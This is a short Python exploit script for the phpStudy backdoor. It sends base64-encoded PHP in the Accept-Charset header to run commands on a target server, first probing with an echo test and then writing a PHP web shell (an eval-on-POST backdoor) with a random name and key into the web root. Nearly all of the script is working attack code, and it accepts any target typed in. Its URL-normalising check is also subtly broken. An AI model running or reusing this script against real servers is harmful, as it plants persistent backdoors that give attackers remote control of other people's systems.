import base64
import random
import requests
import string
head={
    'Accept-Encoding':'gzip,deflate',
    'Accept-Charset':'c3lzdGVtKCJlY2hvIGhhaGExMjMiKTs=' # echo haha123
}

def get_standard_url(url):
    if url[:7] != "http://" or url[:8] != "https://":
        url = "http://"+url
        return url
    else:
        return False

def exp():
    head["Accept-Charset"] = "c3lzdGVtKCJjaGRpciIpOw==" # system("chdir")
    res1 = requests.get(url=url,headers=head,timeout=5,allow_redirects=False)
    path = str(res1.text.split("\n",1)[0]).strip()

    shell_name = ''.join(random.sample(string.ascii_letters+string.digits,8))
    key = ''.join(random.sample(string.ascii_letters+string.digits,4))
    def write_shell(version_path):
        exp = f"fputs(fopen('{path}\{version_path}\WWW\{shell_name}.php','w'),'<?php @eval($_POST[{key}]); ?>');"
        exp_encode = str(base64.b64encode(exp.encode('utf-8'))).split("'",2)[1]
        head['Accept-Charset'] = exp_encode
        requests.get(url=url, headers=head, timeout=5, allow_redirects=False)
    try:
        write_shell('phpStudy')
    except:
        write_shell('PHPTutorial')

    return f"[!] Shell_name={shell_name}.php, Key={key}"

if __name__=="__main__":
    url = input("[+] Target: ")
    url = get_standard_url(url)
    try:
        res = requests.get(url=url, headers=head, timeout=5, allow_redirects=False)
        if res.status_code == 200 and res.text[:7] == "haha123":
            print("[*] POC EXISTS.")
            print(exp())
        else:
            print("[-] POC NOT EXISTS.")
    except:
        print("[!] ERROR!\n")
    